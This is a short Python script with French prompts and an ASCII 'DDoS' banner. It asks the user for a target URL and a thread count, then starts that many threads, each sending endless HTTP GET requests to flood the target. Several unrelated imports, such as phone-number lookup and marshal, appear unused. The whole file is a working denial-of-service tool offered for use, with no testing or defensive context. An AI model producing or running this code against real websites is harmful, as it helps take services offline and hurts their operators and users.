import requests, string, threading, time, random, zlib, os, datetime, fade, phonenumbers, base64, pyshorteners, binascii, marshal, getpass
from marshal import dumps
from colorama import Fore, Style, init
from pystyle import Colors, Colorate
from phonenumbers import geocoder, carrier, timezone

def ddos():
    print(Colorate.Horizontal(Colors.blue_to_white, """
 ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄      ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐     ▐ ▄▀ ▀▄ █  █ ▀  █ 
▐ █    █ ▐ █    █ █      █    ▀▄         █▄▄▄█ ▐  █    █ 
  █    █   █    █ ▀▄    ▄▀ ▀▄   █       ▄▀   █   █    █  
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀       █   ▄▀  ▄▀   ▄▀   
█     ▐  █     ▐            ▐          ▐   ▐   █    █    
▐        ▐                                     ▐    ▐                     """))
    print(f"""{Fore.LIGHTRED_EX}[☽] Démarrage du DDoS""")

    target = input(f"{Fore.LIGHTRED_EX}[☽] Entrez l'URL  --->   ")
    num_threads = int(input(f"{Fore.LIGHTRED_EX}[☽] Entrez le nombre de threads --->   "))

    def ddos(target):
        while True:
            try:
                response = requests.get(target)
                print(f"{Fore.LIGHTRED_EX}f[☽] Demande envoyée à {target} - Code d'état: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.LIGHTRED_EX}[!] Erreur: {e}")

    print(f"{Fore.LIGHTRED_EX}[☽] Initialisation des threads...")

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=ddos, args=(target,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()